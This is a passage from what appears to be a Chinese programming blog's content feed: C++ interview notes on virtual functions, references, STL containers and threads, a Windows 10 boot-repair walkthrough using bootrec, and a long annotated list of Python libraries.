class="line">&#125;</span><br></pre></td></tr></table></figure><p>在基类中的成员函数被声明为虚函数，此函数可以在派生类中被重新定义。重新定义时，函数原型必须相同，即类型、名称、参数个数和顺序必须相同。</p><p>注意：</p><ul><li>在类内声明虚函数，类外定义时不要加virtual</li><li>虚函数无论被公有继承多少次，仍保持虚函数的特性</li><li>虚函数必须是所在类的成员函数，不能是友元函数，也不能是静态函数</li></ul><h2 id="c-比c特别的地方"><a href="#c-比c特别的地方" class="headerlink" title="c++比c特别的地方"></a>c++比c特别的地方</h2><p>设计思想上：</p><p>C++是面向对象的语言，而C是面向过程的结构化编程语言</p><p>语法上：</p><p>C++具有封装、继承和多态三种特性</p><p>C++相比C，增加多许多类型安全的功能，比如强制类型转换、</p><p>C++支持范式编程，比如模板类、函数模板等</p><h2 id="C-C-中指针和引用的区别"><a href="#C-C-中指针和引用的区别" class="headerlink" title="C/C++ 中指针和引用的区别"></a>C/C++ 中指针和引用的区别</h2><p>1.指针有自己的一块空间，而引用只是一个别名；</p><p>2.使用sizeof看一个指针的大小是4，而引用则是被引用对象的大小；</p><p>3.指针可以被初始化为NULL，而引用必须被初始化且必须是一个已有对象的引用；</p><p>4.作为参数传递时，指针需要被解引用才可以对对象进行操作，而直接对引用的修改都会改变引用所指向的对象；</p><p>5.可以有const指针，但是没有const引用；</p><p>6.指针在使用中可以指向其它对象，但是引用只能是一个对象的引用，不能 被改变；</p><p>7.指针可以有多级指针（**p），而引用至于一级；</p><p>8.指针和引用使用++运算符的意义不一样；</p><p>9.如果返回动态内存分配的对象或者内存，必须使用指针，引用可能引起内存泄露。</p><h2 id="为什么析构函数必须是虚函数？为什么C-默认的析构函数不是虚函数"><a href="#为什么析构函数必须是虚函数？为什么C-默认的析构函数不是虚函数" class="headerlink" title="为什么析构函数必须是虚函数？为什么C++默认的析构函数不是虚函数"></a>为什么析构函数必须是虚函数？为什么C++默认的析构函数不是虚函数</h2><p>可以保证当我们new一个子类，然后使用基类指针指向该子类对象，释放基类指针时可以释放掉子类的空间，防止内存泄漏。</p><p>C++默认的析构函数不是虚函数是因为虚函数需要额外的虚函数表和虚表指针，占用额外的内存。而对于不会被继承的类来说，其析构函数如果是虚函数，就会浪费内存。因此C++默认的析构函数不是虚函数，而是只有当需要当作父类时，设置为虚函数。</p><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>函数指针是指向函数的指针变量。C在编译时，每一个函数都有一个入口地址，该入口地址就是函数指针所指向的地址。有了指向函数的指针变量后，可用该指针变量调用函数，就如同用指针变量可引用其他类型变量一样，在这些概念上是大体一致的。</p><p>用途：调用函数和做函数的参数，比如回调函数。</p><h2 id="new-delete与malloc-free的区别是什么"><a href="#new-delete与malloc-free的区别是什么" class="headerlink" title="new/delete与malloc/free的区别是什么"></a>new/delete与malloc/free的区别是什么</h2><p>首先，new/delete是C++的关键字，而malloc/free是C语言的库函数，后者使用必须指明申请内存空间的大小，对于类类型的对象，后者不会调用构造函数和析构函数</p><h2 id="C语言是怎么进行函数调用的？"><a href="#C语言是怎么进行函数调用的？" class="headerlink" title="C语言是怎么进行函数调用的？"></a>C语言是怎么进行函数调用的？</h2><p>每一个函数调用都会分配函数栈，在栈内进行函数执行过程。调用前，先把返回地址压栈，然后把当前函数的esp指针压栈。</p><h2 id="C-如何处理返回值？"><a href="#C-如何处理返回值？" class="headerlink" title="C++如何处理返回值？"></a>C++如何处理返回值？</h2><p>生成一个临时变量，把它的引用作为函数参数传入函数内。</p><h2 id="fork-wait-exec函数"><a href="#fork-wait-exec函数" class="headerlink" title="fork,wait,exec函数"></a>fork,wait,exec函数</h2><p>父进程产生子进程使用fork拷贝出来一个父进程的副本，此时只拷贝了父进程的页表，两个进程都读同一块内存，当有进程写的时候使用写实拷贝机制分配内存，exec函数可以加载一个elf文件去替换父进程，从此父进程和子进程就可以运行不同的程序了。fork从父进程返回子进程的pid，从子进程返回0.调用了wait的父进程将会发生阻塞，直到有子进程状态改变,执行成功返回0，错误返回-1。exec执行成功则子进程从新的程序开始运行，无返回值，执行失败返回-1</p><h2 id="map和set有什么区别，分别又是怎么实现的？"><a href="#map和set有什么区别，分别又是怎么实现的？" class="headerlink" title="map和set有什么区别，分别又是怎么实现的？"></a>map和set有什么区别，分别又是怎么实现的？</h2><p>map和set都是C++的关联容器，其底层实现都是红黑树（RB-Tree）。由于 map 和set所开放的各种操作接口，RB-tree 也都提供了，所以几乎所有的 map 和set的操作行为，都只是转调 RB-tree 的操作行为。</p><p>map和set区别在于：</p><p>（1）map中的元素是key-value（关键字—值）对：关键字起到索引的作用，值则表示与索引相关联的数据；Set与之相对就是关键字的简单集合，set中每个元素只包含一个关键字。</p><p>（2）set的迭代器是const的，不允许修改元素的值；map允许修改value，但不允许修改key。其原因是因为map和set是根据关键字排序来保证其有序性的，如果允许修改key的话，那么首先需要删除该键，然后调节平衡，再插入修改后的键值，调节平衡，如此一来，严重破坏了map和set的结构，导致iterator失效，不知道应该指向改变前的位置，还是指向改变后的位置。所以STL中将set的迭代器设置成const，不允许修改迭代器的值；而map的迭代器则不允许修改key值，允许修改value值。</p><p>（3）map支持下标操作，set不支持下标操作。map可以用key做下标，map的下标运算符[ ]将关键码作为下标去执行查找，如果关键码不存在，则插入一个具有该关键码和mapped_type类型默认值的元素至map中，因此下标运算符[ ]在map应用中需要慎用，const_map不能用，只希望确定某一个关键值是否存在而不希望插入元素时也不应该使用，mapped_type类型没有默认值也不应该使用。如果find能解决需要，尽可能用find。</p><h2 id="STL有什么基本组成"><a href="#STL有什么基本组成" class="headerlink" title="STL有什么基本组成"></a>STL有什么基本组成</h2><p>STL主要由：以下几部分组成：<br>容器迭代器仿函数算法分配器配接器<br>他们之间的关系：分配器给容器分配存储空间，算法通过迭代器获取容器中的内容，仿函数可以协助算法完成各种操作，配接器用来套接适配仿函数</p><h2 id="vector和list的区别"><a href="#vector和list的区别" class="headerlink" title="vector和list的区别"></a>vector和list的区别</h2><p>List：动态链表，在堆上分配空间，每插入一个元数都会分配空间，每删除一个元素都会释放空间。</p><p>区别：</p><p>1）vector底层实现是数组；list是双向 链表。</p><p>2）vector支持随机访问，list不支持。</p><p>3）vector是顺序内存，list不是。</p><p>4）vector在中间节点进行插入删除会导致内存拷贝，list不会。</p><p>5）vector一次性分配好内存，不够时才进行2倍扩容；list每次插入新节点都会进行内存申请。</p><p>6）vector随机访问性能好，插入删除性能差；list随机访问性能差，插入删除性能好。</p><p>3、应用</p><p>vector拥有一段连续的内存空间，因此支持随机访问，如果需要高效的随即访问，而不在乎插入和删除的效率，使用vector。</p><p>list拥有一段不连续的内存空间，如果需要高效的插入和删除，而不关心随机访问，则应使用list。</p><h1 id="开发方面"><a href="#开发方面" class="headerlink" title="开发方面"></a>开发方面</h1><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>每个进程都可以有一个主线程，并且只有一个主线程，实际上是主线程调用main函数的代码，线程可以为一个运行代码的通道，路径，我们可以自己创建多个线程。</p><p>为什么需要多线程，因为我们希望能够把一个任务分解成很多小的部分，各个小部分能够同时执行，而不是只能顺序的执行，以达到节省时间的目的。对于求和，把所有数据一起相加和分段求和再相加没什么区别。</p><p>一个线程只能join一次，多次会引发中断。</p><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p><strong>主线程和子线程之间是同步的关系，即主线程要等待子线程执行完毕才会继续向下执行，join()是一个阻塞函数</strong></p><h4 id="detach"><a href="#detach" class="headerlink" title="detach"></a>detach</h4><p>表示主线程不用等待子线程执行完毕，两者脱离关系.</p><h3 id="joinable"><a href="#joinable" class="headerlink" title="joinable"></a>joinable</h3><p>判断当前线程是否可以做join或者detach过程。</p><h3 id="创建线程的方法"><a href="#创建线程的方法" class="headerlink" title="创建线程的方法"></a>创建线程的方法</h3><ul><li>普通函数</li><li>通过类和对象</li><li>Lambda表达式创建线程</li><li>带参的方式创建线程</li><li>带智能指针创建线程</li><li>通过类的成员函数创建线程</li></ul>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>电脑开机显示找不到grub引导（win10系统）</title>
      <link href="/2021/04-08-windows1-error-resolve.html"/>
      <url>/2021/04-08-windows1-error-resolve.html</url>
      <content type="html"><![CDATA[<p>安装双系统windows和ubuntu后，默认引导是Ubuntu的界面，在删除掉ubuntu系统后会导致找不到grub引导。<br>显示:<br>error: no such device<br>grub rescue&gt;<br>可以用u盘制作一个win10的系统启动盘,然后按下列步骤解决，亲测成功（最坏的解决办法是重装系统）。<br>步骤如下：<br>1.进到u盘的系统安装界面<br>2.选定原来的windows系统所在磁盘，按住shift+F10，调出cmd<br>3.依次键入bootrec /fixmbr 回车；bootrec /fixboot 回车；（命令将尝试修复主引导记录的损坏问题）<br>4.重启</p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python常用库</title>
      <link href="/2020/04-11-python-packages.html"/>
      <url>/2020/04-11-python-packages.html</url>
      <content type="html"><![CDATA[<p>库名称简介</p><p>Chardet 字符编码探测器，可以自动检测文本、网页、xml的编码。</p><p>colorama 主要用来给文本添加各种颜色，并且非常简单易用。</p><p>Prettytable 主要用于在终端或浏览器端构建格式化的输出。</p><p>difflib，[Python]标准库，计算文本差异Levenshtein，快速计算字符串相似度。</p><p>fuzzywuzzy 字符串模糊匹配。</p><p>esmre 正则表达式的加速器。</p><p>shortuuid 一组简洁URL/UUID函数库。</p><p>ftfy，Unicode文本工具7</p><p>unidecode，ascii和Unicode文本转换函数。</p><p>xpinyin，将汉字转换为拼音的函数库</p><p>pangu.py，调整对中日韩文字当中的字母、数字间距。</p><p>pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片</p><p>uniout，提取字符串中可读写的字符</p><p>awesome slugify，一个Python slugify库，用于处理Unicode。</p><p>python-slugify，转换Unicode为ASCII内码的slugify函数库。</p><p>unicode-slugify，生成unicode内码，Django的依赖包。</p><p>ply，Python版的lex和yacc的解析工具phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。</p><p>python-user-agents，浏览器的用户代理（user-agents）的解析器。</p><p>sqlparse，SQL解析器。</p><p>pygments，一个通用的语法高亮工具。</p><p>python-nameparser，解析人名，分解为单独的成分。</p><p>pyparsing，通用解析器生成框架。</p><p>tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。</p><p>python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。</p><p>xlwt/xlrd，读写Excel格式的数据文件。</p><p>xlsxwriter，创建Excel格式的xlsx文件。</p><p>xlwings，利用Python调用Excelcsvkit，CSV文件工具包。</p><p>marmir，把Python[数据结构]，转化为电子表格。</p><p>pdfminer，从PDF文件中提取信息。</p><p>pypdf2， 合并和转换PDF页面的函数库。</p><p>Python-Markdown，轻量级标记语言Markdown的Python实现。</p><p>Mistune，,快速、全功能的纯Python编写的Markdown解释器。</p><p>dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成</p><p>datetime，而rrule是则是根据定义的规则来生成datetime。</p><p>arrow,更好的日期和时间处理Python库</p><p>chronyk，一个Python 3版函数库，用于解析人写的时间和日期。</p><p>delorean，清理期时间的函数库。</p><p>when.py，为见的日期和时间，提供人性化的功能。</p><p>moment，类似Moment.js的日期/时间Python库</p><p>pytz，世界时区，使用tz database时区信息[数据库]</p><p>BeautifulSoup，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析。</p><p>lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。</p><p>htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。</p><p>pyyaml，Python版本的YAML解释器。</p><p>html5lib，-标准库，解析和序列化HTML文档和片段。</p><p>pyquery，类似[jQuery]的的HTML解释器函数库。</p><p>cssutils，Python CSS库。</p><p>MarkupSafe，XML或HTML / XHTML安全字符串标记工具。</p><p>cssutils - ACSS library for Python., MarkupSafe - Implements a XML/HTML/XHTMLbleach，漂白，基于HTML的白名单函数库。</p><p>xmltodict，类似JSON的XML工具包。</p><p>xhtml2pdf，HTML / CSS格式转换器，看生成pdf文档。</p><p>untangle，把XML文档，转换为Python对象，方便访问。</p><p>文件处理</p><p>库名称简介Mimetypes，Python标准库，映射文件名到MIME类型。</p><p>imghdr，Python标准库，确定图像类型。</p><p>python-magic，libmagic文件类型识别库，Python接口格式。</p><p>path.py，os.path模块的二次封装。</p><p>watchdog，一组API和shell实用程序，用于监视文件系统事件。</p><p>Unipath，面向对象的文件/目录的操作工具包。</p><p>pathlib，-（Python 3.4版已经作为Python标准库），一个跨平台，面向path的函数库。pickle/cPickle,python的pickle模块实现了基本的数据序列和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p><p>cPickle是[C语言]实现的版本，速度更快。</p><p>ConfigParser，Python标准库，INI文件解析器。</p><p>configobj，INI文件解析器。</p><p>config，分层次配置，logging作者编写。</p><p>profig，多格式配置转换工具。</p><p>logging，Python标准库，日志文件生成管理函数库。</p><p>logbook，logging的替换品。</p><p>Sentry，实时log服务器。</p><p>Raven，哨兵Sentry的Python客户端。</p><p>Sphinx，斯芬克斯（狮身人面像），Python文档生成器。</p><p>reStructuredText，标记语法和解析工具，Docutils组件。</p><p>mkdocs，Markdown格式文档生成器。</p><p>pycco，简单快速、编程风格的文档生成器。</p><p>pdoc，自动生成的Python库API文档epydoc，从源码注释中生成各种格式文档的工具</p><p>图像处理</p><p>库名称简介PIL（Python Image Library），基于Python的图像处理库，功能强大，对图形文件的格式支持广泛，内置许多图像处理函数，如图像增强、滤波[算法]等。</p><p>Pillow，图像处理库，PIL图像库的分支和升级替代产品。</p><p>Matplotlib，著名的绘图库，提供了整套和matlab相似的命令API，用以绘制一些高质量的数学二维图形，十分适合交互式地进行制图。</p><p>brewer2mpl，有一个专业的python配色工具包，提供了从美术角度来讲的精美配色。</p><p>PyGame基于Python的多媒体开发和游戏软件开发模块，包含大量游戏和图像处理功能。</p><p>Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。</p><p>Pymunk，类似box2d的开源物理图形模拟库。</p><p>OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。</p><p>SimpleCV，计算机视觉开源框架，类似opencv。</p><p>VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。</p><p>cgkit,Python Computer Graphics Kit,其module 主要分两个部分</p><ol><li><p>与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用;</p></li><li><p>提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。</p></li></ol><p>CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。</p><p>Aggdraw，开源图像库，几乎涵盖了2d image操作的所有功能，使用起来非常灵活。</p><p>Pycairo,开源矢量绘图库</p><p>Cairo开罗的python接口，cairo提供在多个背景下做2-D的绘图，高级的更可以使用硬件加速功能。</p><p>wand，Python绑定魔杖工具（MagickWand），C语言API接口。</p><p>thumbor， -智能成像工具，可调整大小和翻转图像。</p><p>imgSeek，查询相似的图像。</p><p>python-qrcode，纯Python的二维码（QR码）生成器。</p><p>pyBarcode，创建条码，无需PIL模块。</p><p>pygram，Instagram像图像过滤器。</p><p>Quads，基于四叉树的计算机艺术。</p><p>nude.py，裸体检测函数。</p><p>scikit-image，scikit工具箱的图像处理库。</p><p>hmap，图像直方图工具。</p><p>bokeh，交互的Web绘图。</p><p>plotly，Web协同的Python和Matplotlib绘制。</p><p>vincent，文森特，Python Vega的函数库。</p><p>d3py，Python绘图库，基于D3.JS, ggplot -API兼容R语言的ggplot2.Kartograph.py，在Python绘制漂亮的SVG地图。</p><p>pygal， SVG图表的创造者。</p><p>pygraphviz，Graphviz的Python接口。</p><p>Fonttlools，ttf字体工具函数包，用于fontforge、ttx等字体软件。</p><p>游戏和多媒体</p><p>库名称简介audiolazy，数字信号处理（DSP）的Python工具包。</p><p>audioread，跨平台（GStreamer + Core Audio + MAD + FFmpeg）音频解码库。</p><p>beets，音乐库管理。dejavu，音频指纹识别算法。</p><p>Dejavu 听一次音频后就会记录该音频的指纹信息，然后可通过麦克风对输入的音频进行识别是否同一首歌。</p><p>django-elastic-transcoder,Django +亚马逊elastic转码。</p><p>eyeD3,音频文件工具，特别是MP3文件包含的ID3元数据。</p><p>id3reader，用于读取MP3的元数据。</p><p>mutagen，处理音频元数据。</p><p>pydub，-操纵音频和简单的高层次的接口。</p><p>pyechonest，Echo Nest API客户端。</p><p>talkbox，语音和信号处理的Python库。</p><p>TimeSide，开放的网络音频处理框架。</p><p>tinytag，读取音乐文件元数据，包括的MP3，OGG，FLAC和wave文件。</p><p>m3u8，用于解析m3u8文件。</p><p>moviepy，多格式视频编辑脚本模块，包括GIF动画。</p><p>shorten.tv，视频摘要。scikit视频，SciPy视频处理例程。</p><p>GeoDjango,一个世界级的地理Web框架。</p><p>geopy,Geo地理编码的工具箱。</p><p>pygeoip，纯Python写的GeoIP API。</p><p>GeoIP，Python API接口，使用高精度GeoIP Legacy Database数据库。</p><p>geojson，GeoJSON函数库django-countries，一个Django程序，提供国家选择，国旗图标的静态文件，和一个国家的地域模型。</p><p>Pygame，Python游戏设计模块。</p><p>Cocos2d，2D游戏框架，演示，和其他的图形/交互应用，基于pyglet。Cocos2d- cocos2d is a framework for building 2D games, demos, and other graphical/interactive applications. It is based on pyglet.,PySDL2，SDL2的封装库。</p><p>Panda3D- 3D游戏引擎，迪士尼开发。用C++写的，完全兼容Python。</p><p>PyOgre，OGRE 3D渲染引擎，可用于游戏，模拟，任何3D。</p><p>PyOpenGL，绑定OpenGL和它相关的API。</p><p>PySFML，Python绑定SFMLRenPy，视觉小说引擎。</p><p>大数据与科学计算</p><p>库名称简介pycuda/opencl，GPU高性能并发计算Pandas，python实现的类似R语言的数据统计、分析平台。基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。</p><p>Open Mining，商业智能（BI），Pandas的Web界面。</p><p>blaze，NumPy和Pandas大数据界面。</p><p>SciPy，开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。</p><p>ScientificPython，一组经过挑选的Python程序模块，用于科学计算，包括几何学（矢量、张量、变换、矢量和张量场），四元数，自动求导数，（线性）插值，多项式，基础统计学，非线性最小二乘拟合，单位计算，Fortran兼容的文本格式，通过VRML的3D显示，以及两个Tk小工具，分别用于绘制线图和3D网格模型。此外还具有到netCDF，MPI和BSPlib库的接口。</p><p>NumPy科学计算库，提供了矩阵，线性代数，傅立叶变换等等的解决方案, 最常用的是它的N维数组对象. NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。</p><p>Cvxopt，最优化计算包，可进行线性规划、二次规划、半正定规划等的计算。</p><p>Numba，科学计算速度优化编译器。</p><p>pymvpa2，是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NetworkX，复杂网络的优化软件包。</p><p>zipline，交易算法的函数库。</p><p>PyDy， Python动态建模函数库。</p><p>SymPy,符号数学的Python库。</p><p>statsmodels,Python的统计建模和计量经济学。</p><p>astropy,天文学界的Python库。</p><p>orange，橙色，数据挖掘，数据可视化，通过可视化编程或Python脚本学习机分析。RDKit,化学信息学和机器学习的软件。</p><p>Open Babel，巴贝尔，开放的化学工具箱。</p><p>cclib，化学软件包的计算函数库。</p><p>Biopython，免费的生物计算工具包。</p><p>bccb，生物分析相关的代码集。</p><p>bcbio-nextgen，提供完全自动化、高通量、测序分析的工具包。</p><p>visvis, 可视化计算模块库，可进行一维到四维数据的可视化。</p><p>MapReduce是Google提出的一个软件[架构]，用于大规模数据集（大于1TB）的并行运算。概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的MapReduce函数库。</p><p>Framworks and libraries for MapReduce.,PySpark，[Spark]的Python API。dpark，Spark的Python克隆，Python中的MapReduce框架。</p><p>luigi，为批量工作，建立复杂的管道。</p><p>mrjob，运行在[Hadoop]，或亚马逊网络服务的，MapReduce工作。</p><p>人工智能与机器学习</p><p>库名称简介NLTK（natural language toolkit)，是python的自然语言处理工具包。2001年推出，包括了大量的词料库，以及自然语言处理方面的算法实现：分词， 词根计算， 分类， 语义分析等。</p><p>Pattern，数据挖掘模块，包括自然语言处理，机器学习工具，等等。</p><p>textblob，提供API为自然语言处理、分解NLP任务。基于NLTK和Pattern模块。</p><p>jieba，结巴，中文分词工具。</p><p>snownlp，用于处理中文文本库。</p><p>loso，中文分词函数库。</p><p>genius，中文CRF基础库，条件随机场(conditional random field,简称 CRF),是一种鉴别式机率模型,是随机场的一种,常用于标注或分析序列资料,如自然语言文字或是生物序列。</p><p>Gensim，一个相当专业的主题模型Python工具包，无论是代码还是文档，可用于如何计算两个文档的相似度LIBSVM,是台湾大学林智仁(Lin Chih-Jen)教授等开发设计的一个简单、易于使用和快速有效的SVM模式识别与回归的软件包，他不但提供了编译好的可在Windows系列系统的执行文件，还提供了源代码，方便改进、修改以及在其它[操作系统]上应用；该软件对SVM所涉及的参数调节相对比较少，提供了很多的默认参数，利用这些默认参数可以解决很多问题；并提供了交互检验(Cross Validation)的功能。该软件可以解决C-SVM、ν-SVM、ε-SVR和ν-SVR等问题，包括基于一对一算法的多类模式识别问题。</p><p>scikits.learn，构建在SciPy之上用于机器学习的 Python 模块。它包括简单而高效的工具，可用于数据挖掘和数据分析。涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。</p><p>PyMC，机器学习采样工具包，scikit-learn似乎是所有人的宠儿，有人认为，PyMC更有魅力。PyMC主要用来做Bayesian分析。</p><p>Orange，基于组件的数据挖掘和机器学习软件套装，它的功能即友好，又很强大，快速而又多功能的可视化编程前端，以便浏览数据分析和可视化，包含了完整的一系列的组件以进行数据预处理，并提供了数据帐目，过渡，建模，模式评估和勘探的功能。侧重数据挖掘，可以用可视化语言或Python进行操作，拥有机器学习组件，还具有生物信息学以及文本挖掘的插件。</p><p>Milk，机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。</p><p>PyMVPA(Multivariate Pattern Analysis in Python),是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等。</p><p>NuPIC，开源人工智能平台。该项目由Grok（原名 Numenta）公司开发，其中包括了公司的算法和软件架构。NuPIC 的运作接近于人脑，“当模式变化的时候，它会忘掉旧模式，记忆新模式”。如人脑一样，CLA 算法能够适应新的变化。</p><p>Pylearn2，-基于Theano的机器学习库。</p><p>hebel，GPU加速，[深度学习]Python库。</p><p>gensim，机器学习库。</p><p>pybrain，机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。pybrain包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。以神经网络为核心，所有的训练方法都以神经网络为一个实例Mahout,是 Apache Software Foundation（ASF） 旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。Mahout包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。此外，通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到云中。</p><p>Crab，灵活的，快速的推荐引擎。</p><p>python-recsys，娱乐系统分析，推荐系统。</p><p>vowpal_porpoise，Vowpal Wabbit轻量级Python封装。</p><p>Theano,用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题的python软件包。它使得写深度学习模型更加容易，同时也给出了一些关于在GPU上训练它们的选项。</p><p>系统与命令行</p><p>库名称简介threading，Python标准线程库，更高级别的线程接口。</p><p>envoy，特使，Python子线程的函数库。</p><p>sh，成熟的子线程替换函数库。</p><p>sarge，封装线程。</p><p>subprocess,调用shell命令的神器argparse，写命令行脚本必备，强大的命令行差数解析工具timeit，计算代码运行的时间等等unp，命令行工具，解压文件。</p><p>eventlet开销很少的多线程模块，使用的是 green threads 概念，例如，pool = eventlet.GreenPool(10000) 这样一条语句便创建了一个可以处理 10000 个客户端连接的线程池。类似Gevent线程库Gevent，多线程模块pytools,著名的python通用函数、工具包SendKeys, 键盘鼠标操作模块, 模拟键盘鼠标模拟操作。</p><p>pyHook,基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。这个库依赖于另一个Python库PyWin32，如同名字所显示的，PyWin32只能运行在Windows平台，所以PyHook也只能运行在Windows平台。</p><p>pstuil,跨平台地很方便获取和控制系统的进程，以及读取系统的CPU占用内存占用等信息.</p><p>cement，一个轻量级的、功能齐全的命令行工具</p><p>click，简单优雅的的命令行接口。</p><p>clint，Python命令行工具。</p><p>cliff，创造多层次指令的命令行程序框架。</p><p>Clime， 可以转换任何模块为多的CLI命令程序，无任何配置。</p><p>docopt，Python命令行参数分析器。</p><p>pycli，命令行应用程序，支持的标准命令行解析，测井，单元[测试]和功能测试。</p><p>Gooey，打开命令行程序，作为为一个完整的GUI应用程序,cookiecutter，命令行工具，从cookiecutters（项目模板）创建项目。例如，Python包项目，jQuery插件项目。percol，为UNIX传统管道pipe命令，添加交互式选择风格。</p><p>rainbowstream，聪明和漂亮的推特客户终端。</p><p>Django Models，Django的一部分SQLAlchemy，Python SQL工具包和对象关系映射。</p><p>peewee，小型的ORM解析器。</p><p>PonyORM，为ORM提供了一种面向SQL的接口。</p><p>MongoEngine，Python对象文件映射，使用[MongoDB]。, Django MongoDB引擎MongoDB , Django后台。</p><p>django-mongodb-engine，Django后台.redisco,一个简单的模型和容器库，使用[Redis]flywheel，Amazon DynamoDB对象映射。</p><p>butterdb，谷歌电子表格的ORM，Python版。</p><p>celery，芹菜，异步任务队列/工作，基于分布式消息队列。</p><p>huey，休伊，轻量级，多线程任务队列。</p><p>mrq，队列先生，分布式任务队列，使用redis &amp; Gevent。</p><p>rq，简单的工作队列。</p><p>Queue,Queue模块可以用来实现多线程间通讯，让各个线程共享数据，生产者把货物放到Queue中，供消费者（线程）去使用。</p><p>simpleq，简单的，可扩展的队列，Amazon SQS基础队列。</p><p>Psyco，超强的python性能优化工具，psyco 的神奇在于它只需要在代码的入口处调用短短两行代码，性能就能提升 40% 或更多，真可谓是立竿见影！如果你的客户觉得你的程序有点慢，敬请不要急着去优化代码，psyco 或许能让他立即改变看法。psyco 堪称 Python 的 jit。fn.py，Python函数编程：缺失的功能享受FP的实现。</p><p>funcy，函数编程工具。</p><p>Toolz，函数编程工具：迭代器、函数，字典。</p><p>CyToolz，Toolz的Cython实现，高性能的函数编程工具。</p><p>Ansible，安塞波，极为简单的自动化平台。</p><p>SaltStack，基础设施的自动化管理系统。</p><p>Fabric，织物，一个简单，远程执行和部署的语言工具。</p><p>Fabtools，Fabric的工具函数。</p><p>cuisine，热门的Fabric的工具函数。</p><p>psutil，跨平台的过程和系统工具模块。</p><p>pexpect，控制互动节目。</p><p>provy，易于使用的配置系统的Python。</p><p>honcho，Foreman的Python接口，用于管理procfile应用工具。</p><p>gunnery，多任务执行工具，与网络接口的分布式系统。</p><p>fig，快速。独立的开发环境中使用泊坞窗。</p><p>APScheduler，轻量级、但功能强大的在线任务调度程序。</p><p>django-schedule,Django日程应用程序。</p><p>doit,任务流道/生成工具。</p><p>Joblib,Python提供的轻量级的流水线工具函数。</p><p>Plan，简易生成crontab文件。</p><p>Spiff，纯Python实现的，功能强大的工作流引擎。</p><p>schedule，Python作业调度。</p><p>TaskFlow，有助于使任务执行简单。</p><p>ctypes，Python标准库，速度更快，Python调用C代码的外部函数接口。</p><p>cffi，Python调用C代码外部函数接口，类似于ctypes直接在